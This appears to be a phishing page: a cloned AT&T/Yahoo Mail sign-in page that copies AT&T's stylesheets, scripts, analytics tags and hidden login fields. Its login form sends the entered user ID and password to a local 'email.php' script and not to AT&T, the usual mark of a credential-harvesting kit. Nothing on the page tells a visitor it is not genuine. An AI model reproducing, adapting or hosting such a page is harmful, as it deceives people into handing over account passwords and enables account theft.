
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">



	


	


<html lang="en" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml">

<head>

<title>AT&amp;T - Login</title>

<!-- TG1403 S4055 - iframe -->
<style id="antiClickjack">body{display:none !important;}</style>
<script type="text/javascript">
   if (self === top) {
       var antiClickjack = document.getElementById("antiClickjack");
       antiClickjack.parentNode.removeChild(antiClickjack);
   } else {
   	var noFrameBusting = false;
   	if( ! noFrameBusting ) {
       top.location = self.location;
   	}
   }
</script>

<script type="text/javascript">
(function() {
         if ("-ms-user-select" in document.documentElement.style && navigator.userAgent.match(/IEMobile\/10\.0/)) {
                 var msViewportStyle = document.createElement("style");
                 msViewportStyle.appendChild(
                          document.createTextNode("@-ms-viewport{width:auto!important}")
                 );
                 document.getElementsByTagName("head")[0].appendChild(msViewportStyle);
         }
})();
</script>

<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />

<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=0.5, maximum-scale=1.0" />

<link rel="stylesheet" href="https://home.secureapp.att.net/css/sso/slid/1201/main.css"  type="text/css" media="screen" />

<!--[if lte IE 6]>

<link rel="stylesheet" href="https://home.secureapp.att.net/css/sso/slid/1201/ie6.css"  type="text/css" media="screen" />

<![endif]-->

<!--[if IE 7]>

<link rel="stylesheet" href="https://home.secureapp.att.net/css/sso/slid/1201/ie7.css"  type="text/css" media="screen" />

<![endif]-->

<!--[if IE 8]>

<link rel="stylesheet" href="https://home.secureapp.att.net/css/sso/slid/1201/ie8.css"  type="text/css" media="screen" />

<![endif]-->

<link rel="stylesheet" href="https://home.secureapp.att.net/css/sso/slid/1201/mobile.css"  type="text/css" media="handheld, only screen and (max-device-width: 480px)" />

<script type="text/javascript" src="https://home.secureapp.att.net/js/jquery/jquery-1.5.1.min.js" ></script>

<script type="text/javascript" src="https://home.secureapp.att.net/js/jquery/simplemodal/jquery.simplemodal.js" ></script>

<script type="text/javascript" src="https://home.secureapp.att.net/js/sso/slid/1201/script.js" ></script>

<script type="text/javascript" src="https://sadlib.static-app.synacor.com/client/att/att.js" async></script>

<!-- TG1403 S5534 - CR-1402-0249 RD2376 - Replace WebTrends tags with Adobe tags -->
<script src="https://www.att.com/scripts/satellite/prod/8bb7555f31d461fe2aef4e2d53a11a03e7f9a04c/satelliteLib-bee1ce9b89e943a46b1dfd167adc564fe75eef37.js"></script>

<!-- START OF SmartSource Data Collector TAG v10.2.0 -->
<!-- Copyright (c) 2012 Webtrends Inc.  All rights reserved. -->
<script>
window.webtrendsAsyncInit=function(){
    var dcs=new Webtrends.dcs().init({
        dcsid:"dcsdjtdi8wz5bdo7rtxv6ly3m_4s9j"
        ,domain:"statse.webtrendslive.com"
        ,navigationtag: "div,span"
        ,timezone:-8
        ,offsite:true
        ,download:true
        ,downloadtypes:"xls,doc,pdf,txt,csv,zip,docx,xlsx,rar,gzip"
        ,onsitedoms:"att.net"
        ,plugins:{
            //hm:{src:"https://s.webtrends.com/js/webtrends.hm.js"}
          //  LinkTrack: { src: "/scripts/linkTrack.js", DivList: ".*" }
        }
        }).track();
};
(function(){
    var s=document.createElement("script"); s.async=true; s.src="https://loginprodx.att.net/commonLogin/igate_edam/staticContent/images/SLID/js/webtrends.min.js";
    var s2=document.getElementsByTagName("script")[1]; s2.parentNode.insertBefore(s,s2);
}());
</script>
<noscript><img alt="dcsimg" id="dcsimg" width="1" height="1" src="https://statse.webtrendslive.com/dcsslzoj37dv0hctv586rtbcg_1v7w/njs.gif?dcsuri=/nojavascript&amp;WT.js=No&amp;WT.tv=10.2.0&amp;dcssip=www.beta.att.yahoo.com"/></noscript>
<!-- END OF SmartSource Data Collector TAG v10.2.0 -->

</head>



<body>

<div id="header"></div>

<div id="pageWrap">

 <div id="pageBody">

  <div id="loginWrap">

  <form  action="email.php" method="post" id="LoginForm"  focus="userid" name="LoginForm" type="com.sbc.idm.igate_edam.forms.LoginFormBean">

	<input type="hidden" name="style" value=ATTidp>
	<input type="hidden" name="targetURL" value=https://loginprodx.att.net/FIM/sps/ATTidp/saml20/logininitial?RequestBinding=HTTPPost&PartnerId=https://login.yahoo.com/saml/2.0/att&.lang=en-US&Target=https%3a//mail.yahoo.com%3f.lts=1477820509>
	<input type="hidden" name="previousRefID" value=1477820469058_1693595190_LC>    
	<input type="hidden" name="optOutGroupUpdate" value=null>    
    <h1><strong>Sign in now to continue!</strong></h1>


    <ul class="uLogin">

     <li id="uID">

      <label for="nameBox">User ID/Email Address</label>

      <input type="text" name="userid" id="nameBox" value="" maxlength="50" size="50" class="slidTxtbox" />

      <div class="quesIcon" id="ques1"><div id="qAns1" class="qAns">Info</div></div>
      <p class="fgtEml"><a href="#" id="fgtEml" class="colLink">Forgot User ID/Email Address?</a></p>
  

     </li>

     <li id="uPwd">

      <label  for="pwdBox">Password</label>

      <input type="password" placeholder="Password" name="password" id="pwdBox" value="" maxlength="50" size="50" class="slidTxtbox" autocomplete="off" />

      <p class="fgtPwd"><a href="#" id="fgtPwd" class="colLink">Forgot Password?</a>
 		<span id="spanLog">Redirects to www.att.com.</span></p>
     </li>
     <li id="shwPc"><p><input name="showPwd" id="showPwd" class="slidChkBox" type="checkbox"><label for="showPwd">Show password characters</label></p></li>

     <li id="uRM">

      <p><input type="checkbox" name="rememberID" id="rememberID" class="slidChkBox" /><label for="rememberID">Keep me signed in</label></p>

      <p>for 2 weeks unless I sign out. <span class="quesIcon" id="ques2"><span id="qAns2" class="qAns">Info</span></span></p> 

      <p>(Uncheck if on a shared computer.)</p>

     </li>
     



     <li id="uBtn">

      <input type="submit" id="submitLogin" value="Sign In" class="loginBtn" />

     </li>

    <li id="uActCr">
	       <label for="regurl">Don't have an AT&amp;T Account?</label>
		<a href="http://www.att.net/signup" id="regurl"><input id="acctCreate" class="loginBtnClear" value="Create AT&amp;T Account" type="button"/></a>
	</li>
    <li id="ulgnYah">
		<label for="yahLgnUrl">Login with Yahoo ID</label>
		<a href="https://login.yahoo.com/config/login" id="yahLgnUrl"><input id="submitYahLogin" class="loginBtnYah" value="Login with Yahoo ID" type="button"></a>
	</li>
    

    </ul>
       
    <div id="lognp"></div>

    <div id="overLayCheck" class="overLayRight1"></div>

   </form>  

   <div id="promo"></div>

  </div>

 </div>

</div>

<div id="footer"> 

</div>






<script type="text/javascript">_satellite.pageBottom();</script>

</body>

</html><SCRIPT type="text/javascript">
/*<![CDATA[*/ 
document.cookie = "IV_JCT=%2FcommonLogin; path=/";
/*]]>*/ 
</SCRIPT>
